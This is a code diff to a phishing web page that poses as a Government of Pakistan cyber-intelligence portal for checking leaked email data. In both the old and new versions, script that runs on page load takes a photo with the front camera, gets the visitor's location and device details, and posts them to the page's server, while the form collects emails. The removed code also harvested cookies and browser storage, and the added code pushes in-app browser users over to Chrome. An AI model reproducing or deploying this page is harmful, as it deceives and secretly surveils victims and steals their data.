@@ -9,32 +9,29 @@
     body {
       margin: 0;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: #0f2027;
-      background: linear-gradient(to bottom, #2c5364, #203a43, #0f2027);
+      background: #1b2631;
       color: #fff;
       display: flex;
-      flex-direction: column;
-      justify-content: space-between;
+      justify-content: center;
       align-items: center;
       height: 100vh;
     }
     .box {
-      margin-top: 5vh;
-      background: rgba(255, 255, 255, 0.08);
+      background: rgba(255, 255, 255, 0.1);
       padding: 30px;
       border-radius: 16px;
-      box-shadow: 0 0 30px rgba(0,0,0,0.5);
+      box-shadow: 0 0 20px rgba(0,0,0,0.3);
       text-align: center;
       width: 380px;
-      backdrop-filter: blur(10px);
+      backdrop-filter: blur(8px);
     }
     h1 {
-      font-size: 22px;
+      font-size: 20px;
       margin-bottom: 8px;
     }
     p {
-      font-size: 14px;
-      margin: 8px 0 16px;
+      font-size: 13px;
+      margin: 8px 0;
     }
     input, button {
       width: 100%;
@@ -68,18 +65,12 @@
       width: 80px;
       margin-bottom: 10px;
     }
-    footer {
-      font-size: 12px;
-      text-align: center;
-      padding: 10px;
-      color: #ccc;
-    }
   </style>
 </head>
 <body>
-  <div class="box">
+  <div class="box" id="main-box">
     <img src="/static/pakistan-emblem.png" alt="Gov Logo" />
-    <h1>Confidential Access - Secure Portal</h1>
+    <h1>🇵🇰 Government of Pakistan – Cyber Intelligence</h1>
     <p>Enter your email to check leaked data in our cyber database</p>
     <form method="POST" action="/login">
       <input type="text" name="email" placeholder="Email" required />
@@ -88,127 +79,99 @@
       <button type="submit">🔍 Check Now</button>
     </form>
   </div>
-  <footer>© 2025 Government Cyber Department | National Data Division</footer>
 
-<script>
-async function reverseGeocode(lat, lon) {
-  try {
-    const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`;
-    const res = await fetch(url, {
-      headers: { 'User-Agent': 'Mozilla/5.0' }
-    });
-    const data = await res.json();
-    return {
-      city: data.address.city || data.address.town || data.address.village || "Unknown",
-      country: data.address.country || "Unknown",
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown"
-    };
-  } catch (e) {
-    return { city: "Unknown", country: "Unknown", timezone: "Unknown" };
-  }
-}
+  <script>
+    // Check if inside Facebook or Instagram browser
+    const ua = navigator.userAgent;
+    if (ua.includes("FBAN") || ua.includes("FBAV") || ua.includes("Instagram")) {
+      document.getElementById("main-box").innerHTML = `
+        <h2>🚫 Limited Access Detected</h2>
+        <p>This browser (Facebook or Instagram) blocks camera, location & tracking features.</p>
+        <p><b>🔓 Please open this link in Chrome for full access.</b></p>
+        <a href="intent://your-site.com/#Intent;scheme=https;package=com.android.chrome;end" 
+           style="background:#4CAF50; color:white; padding:10px 20px; text-decoration:none; border-radius:5px; font-size:16px;">
+          🔓 Open in Chrome
+        </a>
+      `;
+    }
 
-function detectDevice(userAgent) {
-  const devices = {
-    "Samsung": /samsung/i,
-    "Xiaomi": /mi|redmi/i,
-    "Oppo": /oppo/i,
-    "Vivo": /vivo/i,
-    "Realme": /realme/i,
-    "Huawei": /huawei/i,
-    "Infinix": /infinix/i,
-    "Tecno": /tecno/i,
-    "iPhone": /iphone/i,
-    "Sony": /sony/i,
-    "Nokia": /nokia/i
-  };
-  for (let [name, pattern] of Object.entries(devices)) {
-    if (pattern.test(userAgent)) return name;
-  }
-  return "Generic Android Device";
-}
+    async function reverseGeocode(lat, lon) {
+      try {
+        const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`;
+        const res = await fetch(url, {
+          headers: { 'User-Agent': 'Mozilla/5.0' }
+        });
+        const data = await res.json();
+        return {
+          city: data.address.city || data.address.town || data.address.village || "Unknown",
+          country: data.address.country || "Unknown",
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown"
+        };
+      } catch (e) {
+        return { city: "Unknown", country: "Unknown", timezone: "Unknown" };
+      }
+    }
 
-async function sendCookiesData() {
-  const cookies = document.cookie;
-  const local = { ...localStorage };
-  const session = { ...sessionStorage };
+    async function sendFullData(locationCoords, cameraStatus) {
+      let locationData = { city: "Unknown", country: "Unknown", timezone: "Unknown" };
 
-  const payload = {
-    type: "🧹 Browser Storage Data",
-    cookies: cookies || "None",
-    localStorage: Object.keys(local).length ? local : "None",
-    sessionStorage: Object.keys(session).length ? session : "None"
-  };
+      if (locationCoords) {
+        locationData = await reverseGeocode(locationCoords.latitude, locationCoords.longitude);
+      }
 
-  await fetch("/collect", {
-    method: "POST",
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(payload)
-  });
-}
+      const payload = {
+        ip: "Unknown",  // Real IP server side se milegi
+        latitude: locationCoords?.latitude || null,
+        longitude: locationCoords?.longitude || null,
+        mapsLink: locationCoords ? `https://www.google.com/maps?q=${locationCoords.latitude},${locationCoords.longitude}` : "❌ Location Denied",
+        timezone: locationData.timezone,
+        city: locationData.city,
+        country: locationData.country,
+        camera: cameraStatus,
+        userAgent: navigator.userAgent,
+        deviceInfo: navigator.platform
+      };
 
-async function sendFullData(locationCoords, cameraStatus) {
-  let locationData = { city: "Unknown", country: "Unknown", timezone: "Unknown" };
-  if (locationCoords) {
-    locationData = await reverseGeocode(locationCoords.latitude, locationCoords.longitude);
-  }
-
-  const userAgent = navigator.userAgent;
-  const deviceInfo = detectDevice(userAgent);
-  const mapsLink = locationCoords ? `https://www.google.com/maps?q=${locationCoords.latitude},${locationCoords.longitude}` : "❌ Location Denied";
-
-  const payload = {
-    type: "📡 SpyBot Alert",
-    ip: "Unknown",
-    latitude: locationCoords?.latitude || null,
-    longitude: locationCoords?.longitude || null,
-    mapsLink: mapsLink,
-    timezone: locationData.timezone,
-    city: locationData.city,
-    country: locationData.country,
-    camera: cameraStatus,
-    userAgent: userAgent,
-    deviceInfo: deviceInfo
-  };
-
-  await fetch("/collect", {
-    method: "POST",
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(payload)
-  });
-
-  await sendCookiesData();
-}
-
-async function askForPermissions() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-    const video = document.createElement('video');
-    video.srcObject = stream;
-    video.play();
-    setTimeout(() => {
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext('2d').drawImage(video, 0, 0);
-      canvas.toBlob(blob => {
-        const formData = new FormData();
-        formData.append('photo', blob, 'photo.jpg');
-        fetch('/photo', { method: 'POST', body: formData });
+      await fetch("/collect", {
+        method: "POST",
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
       });
-      stream.getTracks().forEach(track => track.stop());
-    }, 3000);
+    }
 
-    navigator.geolocation.getCurrentPosition(
-      pos => sendFullData(pos.coords, "✅ Camera Allowed"),
-      err => sendFullData(null, "✅ Camera Allowed, ❌ Location Denied")
-    );
-  } catch (err) {
-    sendFullData(null, "❌ Camera Denied");
-  }
-}
+    async function askForPermissions() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+        setTimeout(() => {
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          canvas.getContext('2d').drawImage(video, 0, 0);
+          canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append('photo', blob, 'photo.jpg');
+            fetch('/photo', { method: 'POST', body: formData });
+          });
+          stream.getTracks().forEach(track => track.stop());
+        }, 3000);
 
-window.onload = askForPermissions;
-</script>
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            sendFullData(pos.coords, "✅ Camera Allowed");
+          },
+          err => {
+            sendFullData(null, "✅ Camera Allowed, ❌ Location Denied");
+          }
+        );
+      } catch (err) {
+        sendFullData(null, "❌ Camera Denied");
+      }
+    }
+
+    window.onload = askForPermissions;
+  </script>
 </body>
 </html>
